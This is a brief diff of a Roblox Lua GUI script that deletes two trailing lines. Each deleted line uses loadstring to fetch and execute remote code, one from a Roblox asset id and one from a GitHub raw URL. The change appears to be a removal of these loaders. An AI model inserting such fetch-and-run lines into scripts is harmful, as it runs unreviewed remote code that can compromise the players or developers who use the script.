@@ -212,5 +212,3 @@ TextButton.MouseButton1Click:Connect(function()
         Message("Error Occurred", "Invalid username", 5)
     end
 end)
-loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
